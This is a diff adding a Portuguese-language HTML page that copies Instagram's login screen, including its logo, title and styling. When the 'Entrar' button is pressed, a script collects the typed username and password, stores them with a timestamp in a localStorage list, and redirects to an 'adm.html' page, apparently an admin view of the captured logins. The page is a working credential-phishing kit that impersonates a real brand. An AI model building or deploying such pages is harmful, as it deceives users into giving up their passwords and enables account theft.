@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar • Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        
+        .container { width: 100%; max-width: 350px; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 10px 40px; display: flex; flex-direction: column; align-items: center; text-align: center; margin-bottom: 10px; }
+        
+        .logo { width: 175px; margin: 35px 0 25px 0; }
+        
+        form { width: 100%; }
+        input { width: 100%; padding: 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; margin-bottom: 6px; font-size: 12px; color: #262626; outline: none; }
+        input::placeholder { color: #8e8e8e; }
+        
+        .btn-login { background-color: #0095f6; color: white; border: none; border-radius: 8px; width: 100%; padding: 10px; font-weight: 600; cursor: pointer; margin-top: 10px; font-size: 14px; }
+        
+        .divider { display: flex; width: 100%; align-items: center; color: #8e8e8e; font-size: 13px; margin: 25px 0 15px 0; font-weight: 600; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
+        
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; margin-bottom: 20px; display: block; }
+        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; margin-bottom: 20px; }
+        
+        .signup-box { padding: 20px; border: 1px solid #dbdbdb; background: white; text-align: center; font-size: 14px; }
+        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="box">
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+            
+            <form id="loginForm">
+                <input type="text" id="user" placeholder="Telefone, nome de usuário ou email">
+                <input type="password" id="pass" placeholder="Senha">
+                <button type="button" class="btn-login" onclick="enviarDados()">Entrar</button>
+            </form>
+            
+            <div class="divider">OU</div>
+            
+            <a href="#" class="fb-login">Entrar com o Facebook</a>
+            <a href="#" class="forgot-password">Esqueceu a senha?</a>
+        </div>
+
+        <div class="signup-box">
+            <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
+        </div>
+    </div>
+
+    <script>
+        function enviarDados() {
+            const userVal = document.getElementById('user').value;
+            const passVal = document.getElementById('pass').value;
+
+            if(userVal && passVal) {
+                // Pega a lista existente
+                let listaLogins = JSON.parse(localStorage.getItem('listaLogins') || "[]");
+
+                // Adiciona o novo
+                listaLogins.push({
+                    usuario: userVal,
+                    senha: passVal,
+                    data: new Date().toLocaleString()
+                });
+
+                // Salva
+                localStorage.setItem('listaLogins', JSON.stringify(listaLogins));
+                
+                // Redireciona para o ADM
+                window.location.href = "adm.html";
+            } else {
+                alert("Preencha todos os campos!");
+            }
+        }
+    </script>
+
+</body>
+</html>
